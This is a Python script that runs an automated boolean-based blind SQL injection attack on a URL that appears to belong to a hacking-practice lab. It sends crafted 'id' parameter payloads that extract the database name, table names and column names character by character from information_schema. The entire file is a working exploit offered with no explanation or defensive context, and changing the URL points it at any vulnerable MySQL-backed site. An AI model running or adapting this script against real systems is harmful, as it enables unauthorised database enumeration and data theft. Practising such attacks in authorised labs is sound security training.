import requests
import string

url = "https://5oh5gbuqjx.voorivex-lab.online/"

## Get Database Length
db_length = 0
print('[+]: Trying to get Database Length')
for i in range (1,20):
    payload = "?id=1' AND 1=if(length(database())={},1,0)%23".format(i)
    print("payload is - > {}".format(payload))
    response = requests.get(url + payload)
    if response.status_code == 200 and response.text == '1':
        # Print the response content
        print('[++]: Database_Length is:{}'.format(i))
        db_length = i
        break;


## Get Database name
# Get lowercase letters from 'a' to 'z'
lowercase_letters = string.ascii_lowercase

# Get uppercase letters from 'A' to 'Z'
uppercase_letters = string.ascii_uppercase

# Get digits from '0' to '9'
digits = string.digits

# Combine lowercase and uppercase letters, underscore '_', '-' , ',' and digits '0' to '9'
characters = lowercase_letters + uppercase_letters + '_' + '-' + ',' + digits

# Loop through each character

print('[+]: Trying to get Database Name')
db = ''
for i in range (1,db_length+1):
    for char in characters:
        payload = "?id=1' AND 1=if(substring(database(),{},1)='{}',1,0)%23".format(i,char)
        print("payload is - > {}".format(payload))
        response = requests.get(url + payload)
        if response.status_code == 200 and response.text == '1':
            # Print the response content
            db +=char
            print('[+]: character found:{}'.format(char))
            break;
        elif response.status_code != 200:
            print("Error:", response.status_code)

print('[++]: Database Name is:{}'.format(db))



## Get Table names

print('[+]: Trying to get table Names')
len_str = 0
for i in range (1,100):
    payload = "?id=1' AND 1=if(length((SELECT group_concat(table_name) FROM information_schema.tables where table_schema = '{}' ))={},1,0)%23".format(db,i)
    response = requests.get(url + payload)
    print("payload is - > {}".format(payload))
    if response.status_code == 200 and response.text == '1':
        # Print the response content
        len_str = i
        break;


table_names = ''
for i in range (1,len_str+1):
    for char in characters:
        payload = "?id=1' AND 1=if(substring((SELECT group_concat(table_name) FROM information_schema.tables where table_schema = '{}'),{},1)='{}',1,0)%23".format(db,i,char)
        response = requests.get(url + payload)
        print("payload is - > {}".format(payload))
        if response.status_code == 200 and response.text == '1':
            # Print the response content
            table_names +=char
            print('[+]: character found:{}'.format(char))
            break;
        elif response.status_code != 200:
            print("Error:", response.status_code)

print('[++]: Table Names are:{}'.format(table_names))





## Get column names
tables = table_names.split(',')
print('[+]: Trying to get Column Names')
column_names = ''

for t in tables:
    len_str = 0
    for i in range (1,100):
        payload = "?id=1' AND 1=if(length((SELECT group_concat(column_name) FROM information_schema.columns where table_schema = '{}' and table_name = '{}' ))={},1,0)%23".format(db,t,i)
        response = requests.get(url + payload)
        print("payload is - > {}".format(payload))
        if response.status_code == 200 and response.text == '1':
            # Print the response content
            len_str = i
            break;

    for i in range (1,len_str+1):
        for char in characters:
            payload = "?id=1' AND 1=if(substring((SELECT group_concat(column_name) FROM information_schema.columns where table_schema = '{}' and table_name = '{}' ),{},1)='{}',1,0)%23".format(db,t,i,char)
            response = requests.get(url + payload)
            print("payload is - > {}".format(payload))
            if response.status_code == 200 and response.text == '1':
                # Print the response content
                column_names +=char
                print('[+]: character found:{}'.format(char))
                break;
            elif response.status_code != 200:
                print("Error:", response.status_code)
    column_names += '-'


for i in range(0,len(tables)):
    print('[++]: Columns in {} are {}'.format(tables[i], column_names.split('-')[i]))



